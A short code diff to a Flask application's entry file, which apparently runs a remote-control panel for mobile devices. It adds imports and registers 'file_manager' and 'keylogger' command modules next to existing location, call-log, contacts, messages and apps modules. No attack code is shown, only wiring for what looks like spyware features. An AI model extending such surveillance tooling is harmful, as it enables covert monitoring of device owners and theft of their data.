@@ -5,12 +5,12 @@ PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 sys.path.insert(0, PROJECT_ROOT)
 
 from models.users import User
-from flask import Flask, render_template, session, redirect, url_for
+from flask import Flask, render_template, session, redirect, url_for, request, jsonify
 from dotenv import load_dotenv
 from flask_wtf.csrf import CSRFProtect, CSRFError
 from datetime import timedelta
 from user.routes import auth, dashboard, devices
-from user.routes.commands import location, call_details, contacts, device_info, messages, apps
+from user.routes.commands import location, call_details, contacts, device_info, messages, apps, file_manager, keylogger
 import os
 from config.database import init_app, db
 from utils.filters import init_filters
@@ -64,6 +64,8 @@ app.register_blueprint(contacts.contacts_command)
 app.register_blueprint(device_info.device_info_command)
 app.register_blueprint(messages.messages_command)
 app.register_blueprint(apps.apps_command)
+app.register_blueprint(file_manager.file_manager_command)
+app.register_blueprint(keylogger.keylogger_command)
  
 if __name__ == '__main__':
     with app.app_context():
